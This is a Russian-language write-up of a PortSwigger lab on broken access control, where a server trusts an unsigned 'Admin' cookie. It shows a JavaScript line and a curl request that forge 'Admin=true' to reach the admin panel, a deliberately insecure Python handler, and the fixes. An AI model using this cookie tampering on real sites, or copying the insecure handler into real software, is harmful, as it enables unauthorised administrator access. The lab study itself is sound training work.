# Broken Access Control — User role controlled by request parameter

| | |
|---|---|
| **Лаба** | [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter) |
| **Уровень** | Apprentice |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-807: Reliance on Untrusted Inputs in a Security Decision |
| **Дата** | 2026-11-07 |
| **Инструменты** | браузер (DevTools), curl |

---

## 1. Цель

Получить доступ к панели администратора и удалить пользователя `carlos`.

---

## 2. Уязвимость

Роль пользователя хранится в cookie `Admin=false` и используется сервером как
основание для доступа к `/admin`.

Cookie приходит от клиента, не подписана и не связана с серверной сессией —
значит, её значение полностью контролирует пользователь.

```
Cookie: session=<...>; Admin=false
```

---

## 3. Обнаружение

1. Залогинился как `wiener:peter`.
2. Открыл `/admin` → отказ (доступ только администраторам).
3. DevTools → Application → Cookies → увидел `Admin=false`.
4. Поменял на `Admin=true`, обновил страницу → `/admin` открылся.

Альтернатива через консоль:

```javascript
document.cookie = "Admin=true; path=/";
```

---

## 4. Эксплуатация

```bash
curl -i https://<lab>/admin \
  -H "Cookie: session=<ваша_сессия>; Admin=true"
# HTTP/1.1 200 OK → панель отдана
```

В панели нажал «Delete» напротив `carlos` → лаба решена.

![Админ-панель после подмены cookie](img/003-admin-cookie.png)

---

## 5. Почему работает

Сервер принимает решение об авторизации на основании данных, которые прислал
клиент. Cookie — обычный заголовок HTTP: его можно изменить в DevTools, curl
или Burp. Подписи и проверки целостности нет, поэтому `Admin=false`
превращается в `Admin=true` одной правкой.

Ошибка архитектурная: **роль — серверное состояние, а хранится на клиенте.**

---

## 6. Влияние

**В этой лабе:** доступ к админ-панели и удаление пользователей.

**В общем случае:** повышение привилегий до администратора, чтение и изменение
любых данных, создание новых админов, полная компрометация приложения.

---

## 7. Исправление (по приоритету)

1. **Хранить роль на сервере** (сессия или БД); в cookie — только идентификатор сессии.
2. **Никогда не принимать решения о правах по значениям из cookie или параметров запроса.**
3. **Если состояние всё же в cookie — подписывать (HMAC) и проверять подпись.**
4. **Проверять роль на каждом защищённом маршруте**, deny by default.
5. **Логировать и алертить** попытки доступа к `/admin` без прав.

---

## 8. Как это выглядит в коде

### Плохо

```python
@app.get("/admin")
def admin(request: Request):
    # решение о правах на основании данных клиента
    if request.cookies.get("Admin") == "true":
        return render_template("admin.html")
    raise HTTPException(status_code=403)
```

Эквивалентно плохо — роль в query-параметре:

```python
@app.get("/admin")
def admin(role: str = "user"):
    if role == "admin":
        ...
```

### Хорошо

```python
@app.get("/admin")
def admin(user=Depends(current_user)):      # читает серверную сессию/БД
    if user.role != "admin":
        raise HTTPException(status_code=403)
    return render_template("admin.html")
```

---

## 9. Вывод

Скрывать роль в cookie бессмысленно: cookie — это входные данные от клиента,
а не хранилище состояния. Авторизация должна опираться на серверные данные,
которые пользователь не может переписать.

Разница с лабой «Unprotected admin functionality»: там проверки не было вообще,
здесь она есть — но построена на данных, которые контролирует атакующий.
